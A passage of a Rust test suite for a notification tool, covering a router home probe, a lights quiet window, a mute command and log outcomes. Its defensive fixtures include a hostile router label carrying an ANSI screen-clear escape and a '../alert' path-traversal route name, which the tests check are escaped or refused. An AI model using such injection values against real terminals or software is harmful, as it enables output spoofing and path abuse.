    // all. Delivering on either would page the operator for leaving the house.
    let sandbox = Sandbox::new("home-stale-alert-not-home");
    count_alerts(&sandbox);
    // A RECORDING stub under the sensor's own name, so a router that had
    // somehow become a leg leaves a trace instead of exec'ing nothing.
    sandbox.stub_channel(
        "router",
        &format!("cat >\"{}/router.event\"", sandbox.display()),
    );
    let router = RouterStub::start(KEYS_AWAY);
    sandbox.write_config(&stale_config(&router.url()));
    let home = || {
        let mut probe = home_probe(&sandbox);
        run(&mut probe);
    };

    home();
    assert!(alerts(&sandbox).is_empty(), "away is not a staleness");
    router.set_listing(NO_LISTING);
    home();
    assert!(
        alerts(&sandbox).is_empty(),
        "an unreadable answer is not a staleness"
    );
    // The same probe on a Home reading DOES alert, which is what makes the
    // two silences above assertions rather than a test that never armed.
    router.set_listing(KEYS_DISAGREE);
    home();
    assert_eq!(alerts(&sandbox).len(), 1, "a Home reading alerts");
    assert!(
        !sandbox.fired("router"),
        "the roster registers router as a SENSOR: an input carries no routing, \
         so the alert ABOUT its reading can never be delivered back to it"
    );
}

/// The same disagreement, with the OTHER client named in text nobody here
/// typed: a quote and an ANSI screen clear, straight out of the router.
const KEYS_DISAGREE_HOSTILE_LABEL: &str = r#"{"data":[
    {"name":"mister","ipAddress":"192.168.1.169","macAddress":"2e:11:ab:6d:b0:4f"},
    {"name":"mo\"use\u001b[2J","ipAddress":"192.168.1.248","macAddress":"60:82:46:3c:fb:01"}]}"#;

#[test]
fn the_alert_carries_no_secret_and_no_raw_router_text() {
    // TWO SECRETS ARE IN REACH on this path now: the router's own api_key,
    // which `home_mode` reads, and the hermes signing key, which the dispatch
    // reads. Neither may ride an event to a channel or a line to a terminal.
    let sandbox = Sandbox::new("home-stale-alert-secrets");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE_HOSTILE_LABEL);
    sandbox.write_config(&format!(
        "[plugins.hermes]\nenabled = true\nkey = \"hermes-signing-secret\"\n{}",
        router_table(&router.url())
    ));
    let mut probe = home_probe(&sandbox);
    let output = run(&mut probe);

    let delivered = std::fs::read_to_string(sandbox.path("hermes.events")).expect("an alert");
    for secret in ["k-123", "hermes-signing-secret"] {
        assert!(
            !delivered.contains(secret),
            "the delivered event carries {secret:?}: {delivered}"
        );
        assert!(
            !stderr(&output).contains(secret),
            "stderr carries {secret:?}: {}",
            stderr(&output)
        );
        assert!(
            !stdout(&output).contains(secret),
            "the diagnostic carries {secret:?}: {}",
            stdout(&output)
        );
    }
    // THE ROUTER'S OWN STRINGS keep slice 4's escape in the terminal, and
    // reach the alert body not at all: the sentence is built from config KEY
    // NAMES, so a client label cannot ride it out to a channel.
    assert!(
        stdout(&output).contains(
            "home:   device_ipv4 \"192.168.1.248\" matched a different client \
             \"mo\\\"use\\u{1b}[2J\""
        ),
        "the evidence escapes the label: {}",
        stdout(&output)
    );
    assert_eq!(alerts(&sandbox)[0]["detail"], STALE_WARNING);
}

#[test]
fn an_unusable_stale_alert_route_complains_and_still_delivers_the_alert() {
    // LOUD-WARD: a config typo in the ROUTE must not be what silences the
    // warning that route was configured for. The complaint names the config
    // key, because that is the file the operator has to open, and the alert
    // still goes out on the route they would have had by writing nothing.
    let sandbox = Sandbox::new("home-stale-alert-bad-route");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&format!(
        "{}stale_alert_channel = \"../alert\"\n",
        stale_config(&router.url())
    ));
    let mut probe = home_probe(&sandbox);
    let output = run(&mut probe);

    assert_eq!(
        stderr(&output).trim_end(),
        "pns: config error (stale_alert_channel = \"../alert\" in [plugins.router] is not a \
         usable route name); the stale alert posts to the default route"
    );
    assert_eq!(
        alerts(&sandbox).len(),
        1,
        "the alert is still delivered, on the default route"
    );
    assert_eq!(
        stdout(&output),
        format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n"),
        "and the diagnostic itself is untouched"
    );
}

#[test]
fn every_way_the_home_probe_is_not_set_up_says_which_one_it_is() {
    // `home_mode` is the ONE place a cause becomes the line an operator
    // reads, and that wiring only runs through the binary: collapsing its two
    // failure arms onto a single message left every other test green, so a
    // disabled probe and a brand nothing answers could both print "no
    // api_key" with nothing to say so. Exact lines, because a cause that
    // merely contains "home:" sends the operator to the wrong edit.
    let sandbox = Sandbox::new("home-setup-failures");
    // Every case here stops before the router is read, so none of them can
    // reach a delivery; it still runs in the safe environment, because "this
    // path happens not to dispatch today" is not a property a test should be
    // relying on to stay off the operator's real gateway.
    let home_line = || {
        let mut probe = home_probe(&sandbox);
        stdout(&run(&mut probe)).trim_end().to_string()
    };
    // No config has been written yet, so this case has to come first.
    assert_eq!(home_line(), "home: not configured (no config file)");
    for (config, line) in [
        (
            // The retired feature table, refused by NAME rather than ignored.
            "[home]\nrouter_url = \"https://192.168.1.1\"\nphone = \"mister\"\n",
            "home: config error (unknown top-level key `home`)",
        ),
        (
            "[plugins.hermes]\nenabled = true\n",
            "home: not configured (no [plugins.router] table)",
        ),
        (
            "[plugins.router]\nenabled = false\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: [plugins.router] is present but enabled = false",
        ),
        (
            "[plugins.router]\nenabled = true\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: no brand in [plugins.router] (the only brand is \"unifi\")",
        ),
        (
            "[plugins.router]\nenabled = true\nbrand = \"asus\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: [plugins.router] has brand \"asus\", which no compiled-in backend answers \
             (the only brand is \"unifi\")",
        ),
        (
            // The URL is the one setting left outside the device keys, so it
            // keeps its own line, and that line no longer names them.
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             device_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: the [plugins.router] table is present but router_url is missing, empty, \
             or not a string",
        ),
        (
            // A table with no device in it at all. A config still carrying the
            // retired `phone` key lands here, and the line names the three keys
            // to set rather than the key that went away: no back-compat, so
            // nothing here mentions `phone`.
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\nphone = \"mister\"\napi_key = \"k-123\"\n",
            "home: no device to look for in [plugins.router] \
             (set at least one of device_mac, device_hostname, device_ipv4)",
        ),
        (
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_ipv4 = \"192.168.1\"\napi_key = \"k-123\"\n",
            "home: device_ipv4 = \"192.168.1\" in [plugins.router] is not an IPv4 address \
             (a dotted quad, e.g. \"192.168.1.169\")",
        ),
        (
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_mac = \"2e11ab6db04f\"\napi_key = \"k-123\"\n",
            "home: device_mac = \"2e11ab6db04f\" in [plugins.router] is not a MAC address \
             (six hex pairs under one separator, e.g. \"2e:11:ab:6d:b0:4f\")",
        ),
        (
            // Everything else is in order, so the key is the only thing left
            // to be missing, and the probe stops before it reaches a router.
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\n",
            "home: no api_key in the [plugins.router] table (the probe is not set up)",
        ),
    ] {
        sandbox.write_config(config);
        assert_eq!(home_line(), line, "case: {config:?}");
    }
}

// --- the lights quiet window ------------------------------------------------

/// The pulse's whole visible effect at this boundary is whether it dialled, so
/// a bare loopback listener IS the bridge: nothing here speaks CLIP and
/// nothing has to.
fn bridge_spy() -> (std::net::TcpListener, u16) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("listener");
    let port = listener.local_addr().expect("addr").port();
    listener.set_nonblocking(true).expect("nonblocking");
    (listener, port)
}

/// Whether the pulse dialled the bridge inside `limit`.
///
/// ACCEPTING HANGS UP AT ONCE, which is what keeps a test that expects a dial
/// fast: the engine's TLS handshake fails on the closed socket instead of
/// waiting out the ten-second bridge deadline.
fn dialled_within(listener: &std::net::TcpListener, limit: std::time::Duration) -> bool {
    let deadline = std::time::Instant::now() + limit;
    loop {
        match listener.accept() {
            Ok(_) => return true,
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {}
            Err(error) => panic!("the bridge spy stopped listening: {error}"),
        }
        if std::time::Instant::now() >= deadline {
            return false;
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

/// Long enough for a dial that was going to happen to have happened: the child
/// has already exited by the time this is asked, so the connection would be
/// sitting in the accept queue.
const SETTLE: std::time::Duration = std::time::Duration::from_millis(200);

/// The UTC minute of the day, from the epoch alone. Every test below pins the
/// child to `TZ=UTC`, so this is the minute the engine's own clock reads,
/// with no local-time library on this side of the boundary.
fn utc_minute_now() -> u16 {
    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs();
    u16::try_from((epoch % 86_400) / 60).expect("a minute of the day")
}

/// A window `radius` minutes either side of `centre`, wrapped into the day and
/// spelled the way the config takes it. Hours wide on purpose: the child reads
/// its own clock a moment after this one does, and a window that narrow would
/// be timing the test rather than the gate.
fn window_around(centre: u16, radius: u16) -> String {
    let start = (centre + 1440 - radius) % 1440;
    let end = (centre + radius) % 1440;
    format!(
        "{:02}:{:02}-{:02}:{:02}",
        start / 60,
        start % 60,
        end / 60,
        end % 60
    )
}

#[test]
fn a_pulse_earned_inside_the_quiet_window_reaches_no_bridge_and_costs_no_other_leg() {
    // The window mutes the LIGHTS and nothing else: the card and the log are
    // how a long command reports at any hour, and only the room stays dark.
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-mutes-the-pulse");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"{}\"\n[plugins.moshi]\nenabled = true\n\
         [plugins.hermes]\nenabled = true\n",
        window_around(utc_minute_now(), 120)
    ));
    let mut command = sandbox.pns();
    command.env("TZ", "UTC");
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    assert!(
        sandbox.fired("moshi") && sandbox.fired("hermes"),
        "every other leg still dispatches inside the window"
    );
    assert!(
        !dialled_within(&listener, SETTLE),
        "and the room stays dark"
    );
}

#[test]
fn a_malformed_quiet_hours_refuses_once_and_only_where_a_pulse_was_due() {
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-malformed");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"10pm-7am\"\n[plugins.hermes]\nenabled = true\n"
    ));

    // An event that earned no pulse says nothing about the window: a refusal
    // on every notification is the noise this gate sits inside the `if` to
    // avoid.
    let mut ordinary = sandbox.pns();
    sandbox.stub_herdr(&mut ordinary, false);
    let ordinary = run(ordinary.args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(
        !stderr(&ordinary).contains("quiet_hours"),
        "a notification that was never going to light the room is not where a \
         window is diagnosed: {}",
        stderr(&ordinary)
    );

    let mut pulsing = sandbox.pns();
    sandbox.stub_herdr(&mut pulsing, false);
    let pulsing = run(pulsing
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    let said = stderr(&pulsing);
    assert_eq!(
        said.matches("hue.quiet_hours").count(),
        1,
        "one refusal, naming the key: {said}"
    );
    assert!(
        said.contains("10pm-7am"),
        "and echoing what was written: {said}"
    );
    assert!(
        !dialled_within(&listener, SETTLE),
        "a window nobody can parse leaves the room dark rather than flashing it"
    );
}

#[test]
fn the_hand_run_pulse_reaches_the_bridge_inside_the_quiet_window() {
    // The drill is EXEMPT, structurally: `pns pulse` never passes the event
    // path's gate, because gating it would make the quiet window impossible to
    // check by hand exactly while it is on.
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-manual-pulse");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"{}\"\n",
        window_around(utc_minute_now(), 120)
    ));
    let mut command = sandbox.bare();
    command.env("TZ", "UTC");
    let child = command
        .args(["pulse", "0"])
        .spawn()
        .expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "the operator asked for a pulse by hand and got one"
    );
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(5)),
        Some(0),
        "and it still exits zero"
    );
}

/// The `[plugins.hue]` config the two halves below share, quiet hours apart.
fn hue_config(port: u16, quiet_hours: &str) -> String {
    format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"{quiet_hours}\"\n[plugins.hermes]\nenabled = true\n"
    )
}

/// Asia/Tokyo: nine hours ahead of UTC, and no daylight saving since 1951, so
/// the child's own minute of the day is arithmetic on this side and no window
/// here can straddle a transition.
const TOKYO_MINUTES_AHEAD: u16 = 9 * 60;

#[test]
fn the_window_is_read_in_the_zone_the_child_was_given() {
    // THE ONE TEST PROVING THE ZONE WIRING. Both halves are built from Tokyo
    // time, and both are placed so that a child reading the HOST's zone (or
    // UTC, on a runner that has no other) lands on the wrong side: the quiet
    // half would dial, and the loud half, which is the twelve hours on the far
    // side of the clock, would go dark.
    let tokyo_now = (utc_minute_now() + TOKYO_MINUTES_AHEAD) % 1440;

    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-zone-quiet");
    sandbox.write_config(&hue_config(port, &window_around(tokyo_now, 120)));
    let mut quiet = sandbox.pns();
    quiet.env("TZ", "Asia/Tokyo");
    sandbox.stub_herdr(&mut quiet, false);
    run(quiet
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    assert!(
        !dialled_within(&listener, SETTLE),
        "the child is inside a window written in ITS zone, so the room stays dark"
    );

    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-zone-loud");
    sandbox.write_config(&hue_config(
        port,
        &window_around((tokyo_now + 720) % 1440, 360),
    ));
    let mut loud = sandbox.pns();
    loud.env("TZ", "Asia/Tokyo");
    sandbox.stub_herdr(&mut loud, false);
    let child = loud
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"])
        .spawn()
        .expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "and outside one it pulses"
    );
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(5)),
        Some(0),
        "on the exit-zero edge either way"
    );
}

// --- the operator mute ------------------------------------------------------

/// The mute command, with its state file inside the sandbox.
///
/// `PNS_STATE_DIR` RIDES ON THE COMMAND, never through `set_var`: this binary
/// is threaded, and a process-wide mutation would decide another test's mute.
fn quiet_command(sandbox: &Sandbox) -> std::process::Command {
    let mut command = sandbox.pns();
    command.env("PNS_STATE_DIR", sandbox.path("state"));
    command.arg("quiet");
    command
}

/// The state file the mute is published to.
fn quiet_state(sandbox: &Sandbox) -> std::path::PathBuf {
    sandbox.path("state/quiet-until")
}

/// When the mute on disk was last written.
fn modified_at(sandbox: &Sandbox) -> std::time::SystemTime {
    std::fs::metadata(quiet_state(sandbox))
        .expect("the mute is on disk")
        .modified()
        .expect("a modification time")
}

/// The state directory's mode, which is how a failed publish is reached
/// without a fault-injection point in the binary. ALWAYS PUT BACK before the
/// assertions: a directory left at 0500 is one the sandbox's own cleanup
/// cannot remove.
fn set_state_mode(sandbox: &Sandbox, mode: u32) {
    std::fs::set_permissions(
        sandbox.path("state"),
        std::os::unix::fs::PermissionsExt::from_mode(mode),
    )
    .expect("the state directory's mode");
}

#[test]
fn a_typed_duration_is_published_as_an_expiry_and_reporting_it_does_not_move_it() {
    let sandbox = Sandbox::new("quiet-set");
    let output = run(quiet_command(&sandbox).arg("30m"));
    assert_eq!(
        stdout(&output).trim_end(),
        "pns: quiet for another 30 minutes"
    );
    let published =
        std::fs::read_to_string(quiet_state(&sandbox)).expect("the mute is on disk to survive");
    // ONE ABSOLUTE EXPIRY, not a flag and not a start plus a duration: every
    // reader compares it with its own clock, so nothing has to know when the
    // mute began and a file left behind after the window is inert.
    let expiry: u64 = published.trim().parse().expect("one epoch second");
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs();
    assert!(
        (now + 1_795..=now + 1_800).contains(&expiry),
        "thirty minutes from now, got {expiry} against {now}"
    );

    // THE NO-ARGUMENT FORM REPORTS AND MUTES NOTHING, which is what keeps any
    // invocation from muting by accident.
    //
    // THE MODIFICATION TIME IS THE PIN, not the content: a re-publish writes
    // the same bytes in the same second, so comparing content caught it about
    // three times in a hundred. The publish renames a fresh file into place,
    // which moves the mtime whether or not the bytes changed.
    let published_at = modified_at(&sandbox);
    let again = run(&mut quiet_command(&sandbox));
    assert_eq!(
        stdout(&again).trim_end(),
        "pns: quiet for another 30 minutes"
    );
    assert_eq!(
        modified_at(&sandbox),
        published_at,
        "a report must not rewrite the mute it is reporting"
    );
}

#[test]
fn off_removes_the_state_file_and_the_next_event_decorates_again() {
    let sandbox = Sandbox::new("quiet-off");
    run(quiet_command(&sandbox).arg("30m"));
    assert!(quiet_state(&sandbox).exists(), "muted to begin with");

    let output = run(quiet_command(&sandbox).arg("off"));
    assert_eq!(stdout(&output).trim_end(), "pns: not quiet");
    // UNLINKED, not overwritten with a past expiry or a flag reading off: an
    // absent file is the state every reader already treats as not muted.
    assert!(
        !quiet_state(&sandbox).exists(),
        "off leaves nothing behind to interpret"
    );

    let mut event = sandbox.pns();
    event.env("PNS_STATE_DIR", sandbox.path("state"));
    event.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut event, false);
    run(event
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(
        sandbox.fired("macos-banner"),
        "the banner is back the moment the mute is off"
    );
}

#[test]
fn a_muted_away_event_reaches_the_durable_log_alone_and_never_the_bridge() {
    // The whole mute, end to end: a file, a clock and a subcommand, which is
    // only provable through the binary. Away and long running is the loudest
    // row in the matrix, so it is the one worth silencing.
    let away_and_long = |sandbox: &Sandbox, port: u16| {
        sandbox.write_config(&format!(
            "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
             [plugins.moshi]\nenabled = true\n[plugins.hermes]\nenabled = true\n\
             [plugins.macos-banner]\nenabled = true\n"
        ));
        let mut event = sandbox.pns();
        event.env("PNS_STATE_DIR", sandbox.path("state"));
        event
            .args(["--agent", "claude", "--state", "done", "--detail", "x"])
            .args(["--pane", "t1:p2", "--long-running"]);
        event
    };

    // THE UNMUTED CONTROL, so the silence below is the mute and not a config
    // that was never going to fire anything.
    let (listener, port) = bridge_spy();
    let loud = Sandbox::new("quiet-muted-control");
    let mut command = away_and_long(&loud, port);
    let child = command.spawn().expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "unmuted control: the room lights"
    );
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(5)),
        Some(0)
    );
    assert!(loud.fired("moshi"), "unmuted control: the phone is carded");

    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-muted-event");
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    let expiry = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs()
        + 600;
    std::fs::write(quiet_state(&sandbox), format!("{expiry}\n")).expect("the mute");
    run(&mut away_and_long(&sandbox, port));

    assert!(
        sandbox.fired("hermes"),
        "THE RECORD SURVIVES THE MUTE: hermes is not a field of the delivery \
         plan, so the durable log is exempt structurally and the mute is lossless"
    );
    assert!(!sandbox.fired("moshi"), "no card while muted");
    assert!(!sandbox.fired("macos-banner"), "no banner while muted");
    assert!(
        !dialled_within(&listener, SETTLE),
        "and no pulse, so slice 7's window is never even consulted"
    );
}

#[test]
fn a_corrupt_state_file_delivers_everything_and_complains_once_per_event() {
    // THE FAIL DIRECTION, and the one a reviewer should attack first: a file
    // nobody can parse is NOT muted. Failing closed here would cost every
    // notification, including the card for a tool call the operator is blocked
    // on, with no expiry on it and nothing announcing the state.
    let sandbox = Sandbox::new("quiet-corrupt");
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    std::fs::write(quiet_state(&sandbox), "later\n").expect("a broken mute");

    let mut event = sandbox.pns();
    event.env("PNS_STATE_DIR", sandbox.path("state"));
    // At the desk with the pane out of sight, and the card forced: the one
    // event that earns BOTH decorations, so a mute reading true here would be
    // unmissable.
    event.env("PNS_IDLE_SECS", "0");
    event.env("PNS_FORCE_PHONE", "1");
    sandbox.stub_herdr(&mut event, false);
    let output = run(event
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));

    assert!(sandbox.fired("macos-banner"), "a broken mute mutes nothing");
    assert!(sandbox.fired("moshi"), "including a forced card");
    assert!(sandbox.fired("hermes"));
    // ONE COMPLAINT PER EVENT, not one per reader: the file is broken until
    // someone fixes it, so it repeats on the next event, but a single run must
    // not say it twice.
    let complaints = stderr(&output)
        .lines()
        .filter(|line| line.starts_with("pns: state error"))
        .map(String::from)
        .collect::<Vec<_>>();
    assert_eq!(
        complaints,
        vec![
            "pns: state error (quiet-until is \"later\", not an expiry time); \
             nothing is muted, clear it with pns quiet off"
        ],
        "the file's own content, and the remedy, said once: {}",
        stderr(&output)
    );
}

#[test]
fn an_absent_state_file_is_the_ordinary_state_and_says_nothing() {
    // The normal case must be silent, or the complaint becomes noise on every
    // event forever and stops being read.
    let sandbox = Sandbox::new("quiet-absent");
    let mut event = sandbox.pns();
    event.env("PNS_STATE_DIR", sandbox.path("state"));
    event.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut event, false);
    let output = run(event
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("macos-banner"));
    assert_eq!(stderr(&output), "", "no file, no news");
}

#[test]
fn a_word_the_mute_does_not_serve_prints_usage_exits_nonzero_and_writes_no_state() {
    // A SUBCOMMAND THAT SILENTLY ACCEPTS A TYPO IS A MUTE THE OPERATOR
    // BELIEVES IS ON. This is not the always-exit-0 contract's territory: that
    // covers the hook and notification paths, where a non-zero exit would fail
    // the turn being reported on, and `pns quiet` is hand typed.
    const USAGE: &str =
        "pns: usage: pns quiet [<duration>|off]; duration is <count><s|m|h>, from 1s to 24h";
    for arguments in [
        vec!["tomorrow"],
        vec!["30"],
        vec!["off", "please"],
        vec!["30m", "extra"],
    ] {
        let sandbox = Sandbox::new("quiet-refusal");
        let output = quiet_command(&sandbox)
            .args(&arguments)
            .output()
            .expect("the engine runs");
        assert_eq!(
            output.status.code(),
            Some(2),
            "arguments: {arguments:?}, stderr: {}",
            stderr(&output)
        );
        assert!(
            stderr(&output).lines().any(|line| line == USAGE),
            "arguments: {arguments:?}, stderr: {}",
            stderr(&output)
        );
        assert_eq!(stdout(&output), "", "arguments: {arguments:?}");
        assert!(
            !quiet_state(&sandbox).exists(),
            "a refused mute writes no state: {arguments:?}"
        );
    }
}

#[test]
fn a_state_file_that_cannot_be_read_delivers_everything_and_complains_once_per_event() {
    // A READ ERROR IS NOT AN ABSENT FILE, and one `.ok()?` read both the same
    // way: an unreadable quiet-until muted nothing and said nothing, so the
    // operator had no way to learn the state file was broken. Fail open is
    // untouched; what changes is that it is announced.
    //
    // A DIRECTORY IN THE FILE'S PLACE is the portable vehicle. A chmod-000
    // file is not: a runner with enough privilege reads it anyway, and the
    // pin becomes a flake that depends on who ran the suite.
    let sandbox = Sandbox::new("quiet-unreadable");
    std::fs::create_dir_all(quiet_state(&sandbox)).expect("a directory where the file goes");

    let mut event = sandbox.pns();
    event.env("PNS_STATE_DIR", sandbox.path("state"));
    // At the desk with the pane out of sight and the card forced, the same
    // both-decorations row the corrupt-file pin uses, so a mute reading true
    // here would be unmissable.
    event.env("PNS_IDLE_SECS", "0");
    event.env("PNS_FORCE_PHONE", "1");
    sandbox.stub_herdr(&mut event, false);
    let output = run(event
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));

    assert!(
        sandbox.fired("macos-banner"),
        "an unreadable mute mutes nothing"
    );
    assert!(sandbox.fired("moshi"), "including a forced card");
    assert!(sandbox.fired("hermes"));
    let complaints = stderr(&output)
        .lines()
        .filter(|line| line.starts_with("pns: state error"))
        .map(String::from)
        .collect::<Vec<_>>();
    assert_eq!(
        complaints.len(),
        1,
        "one complaint per event, not one per reader: {}",
        stderr(&output)
    );
    // THE ERROR IS NAMED but not quoted verbatim: the operating system owns
    // that text, and pinning it would fail on a kernel that reworded it.
    assert!(
        complaints[0].starts_with("pns: state error (quiet-until could not be read: ")
            && complaints[0].ends_with("); nothing is muted, clear it with pns quiet off"),
        "the shape the parse complaint already uses, with the error inside: {}",
        complaints[0]
    );
}

#[test]
fn a_mute_that_could_not_be_written_reports_the_mute_that_still_stands() {
    // MEASURED: with a live mute on disk and the state directory read-only,
    // the failed write said "nothing is muted" and a bare `pns quiet` a second
    // later reported the old mute still on. A run that could not write knows
    // nothing about what stands, so it reads the standing state back off the
    // file rather than asserting the state it wanted.
    let sandbox = Sandbox::new("quiet-write-fails-over-a-mute");
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    let standing = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs()
        + 3_600;
    std::fs::write(quiet_state(&sandbox), format!("{standing}\n")).expect("the standing mute");
    set_state_mode(&sandbox, 0o500);
    let output = quiet_command(&sandbox)
        .arg("30m")
        .output()
        .expect("the engine runs");
    set_state_mode(&sandbox, 0o755);

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(
        stderr(&output)
            .lines()
            .any(|line| line.starts_with("pns: state error (quiet-until could not be written: ")),
        "loud about the write it could not make: {}",
        stderr(&output)
    );
    assert_eq!(
        stdout(&output).trim_end(),
        "pns: quiet for another 60 minutes",
        "the mute that still stands, not the one this run failed to set"
    );
    assert_eq!(
        std::fs::read_to_string(quiet_state(&sandbox)).expect("the standing mute survives"),
        format!("{standing}\n"),
        "and the failed run moved nothing"
    );
}

#[test]
fn a_mute_that_could_not_be_written_exits_nonzero_and_leaves_no_state_behind() {
    // NOTHING PINNED THE EXIT CODE: `return 1` mutated to `return 0` survived
    // the whole suite. A caller reading a zero here treats a mute that never
    // landed as one that did, which is the failure this subcommand exits
    // non-zero at all to prevent.
    let sandbox = Sandbox::new("quiet-write-fails");
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    set_state_mode(&sandbox, 0o500);
    let output = quiet_command(&sandbox)
        .arg("30m")
        .output()
        .expect("the engine runs");
    set_state_mode(&sandbox, 0o755);

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(
        stderr(&output)
            .lines()
            .any(|line| line.starts_with("pns: state error (quiet-until could not be written: ")),
        "loud, never silent: {}",
        stderr(&output)
    );
    assert!(
        !quiet_state(&sandbox).exists(),
        "and no half-set mute left on disk"
    );
}

#[test]
fn a_publish_whose_rename_fails_leaves_no_pending_file_behind() {
    // A DIRECTORY AT `quiet-until` fails the RENAME rather than the write, so
    // the pending file exists by the time the publish gives up. Nothing pinned
    // that it is unlinked, and one left behind is a state directory that grows
    // a file per failed run for the next reader to trip over.
    let sandbox = Sandbox::new("quiet-rename-fails");
    std::fs::create_dir_all(quiet_state(&sandbox)).expect("a directory where the file goes");
    let output = quiet_command(&sandbox)
        .arg("30m")
        .output()
        .expect("the engine runs");

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let pending = std::fs::read_dir(sandbox.path("state"))
        .expect("the state dir")
        .flatten()
        .map(|entry| entry.file_name().to_string_lossy().into_owned())
        .filter(|name| name.starts_with("quiet-until.new."))
        .collect::<Vec<_>>();
    assert!(
        pending.is_empty(),
        "left in the state directory: {pending:?}"
    );
}

// --- the durable log's printed outcomes -------------------------------------

/// Every hermes outcome an event can reach WITHOUT a live gateway, byte for
/// byte.
///
/// The proof that moving the `pns: ` prefix off the four sentences and onto the
/// one print site changed nothing an operator reads. `tests/native.rs` pins the
/// two outcomes that need a gateway to answer (200 and 401) against the capture
/// server; these are the three that need nothing listening, so between them the
/// set is complete.
#[test]
fn every_hermes_outcome_an_event_can_reach_prints_exactly_what_it_printed_before() {
    for (case, config, url, expected) in [
        (
            "no key in the config",
            "[plugins.hermes]\nenabled = true\n",
            "http://127.0.0.1:1/hook",
            "pns: post SKIPPED -- no hermes key in the config ([plugins.hermes] key); nothing was sent\n",
        ),
        (
            "a gateway nothing is listening for",
            "[plugins.hermes]\nenabled = true\nkey = \"k\"\n",
            "http://127.0.0.1:1/hook",
            "pns: post FAILED HTTP 000 (no response; is the hermes gateway up?)\n",
        ),
        (
            "a url that is never put on the wire",
            "[plugins.hermes]\nenabled = true\nkey = \"k\"\n",
            "http://[::1",
            "pns: post FAILED (curl reported no HTTP status at all)\n",
        ),
    ] {
        let sandbox = Sandbox::new("hermes-outcome-lines");
        sandbox.write_config(config);
        let mut command = sandbox.bare();
        command.env("PNS_HERMES_URL", url);
        let output = run(command
            .args(["--agent", "weekly", "--state", "done", "--detail", "ran"])
            .arg("--remote-only"));
